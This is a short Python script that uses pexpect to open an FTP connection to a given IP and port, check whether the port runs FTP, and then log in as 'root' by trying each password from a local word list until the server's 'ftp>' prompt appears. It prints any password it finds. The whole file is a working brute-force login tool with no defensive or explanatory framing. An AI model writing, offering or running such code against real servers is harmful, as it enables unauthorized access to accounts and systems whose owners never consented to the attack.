import pexpect


def connect(ip, port):
    connStr = 'ftp ' + ip + ' ' + port
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.EOF, 'Name .*:', \
                        '[P|p]assword:', pexpect.TIMEOUT], timeout=10)

    fn = open('/root/Desktop/passFile.txt', 'r')

    # print(ret)
    if ret == 0:  # EOF
        print('[-] ' + port + ' is not FTP port.')
        a = 0
        return a
    if ret == 1:  # FTP Service
        print("\033[34m" + '[+] ' + port + ' is FTP port.' + "\033[0m")
        print('-------- PASSWORD ATTACKING -------- ')
        child.sendline('root')
        ret = child.expect([pexpect.TIMEOUT, pexpect.EOF, \
                            '[P|p]assword'], timeout=5)
        a = 1

        if ret == 2:
            for line in fn.readlines():
                print('[-] Password :' + line.strip('\n'))
                child.sendline(line.strip('\n'))
                prom = child.expect([pexpect.EOF, pexpect.TIMEOUT, 'ftp>'], timeout=5)
                if prom == 2:
                    print("\033[31m" + '[+] FIND ! Password : ' + line.strip('\n') + "\033[0m")
                    print('-------------------------------------')
                    return a
        print('------------------------------------ ')

        return a
    if ret == 2:
        print("\033[34m" + '[+] ' + port + ' is FTP service.. ' + "\033[0m")
        a = 1
        return a
    else:
        print('[-] ' + port + ' is not FTP port.')
        a = 0
        return a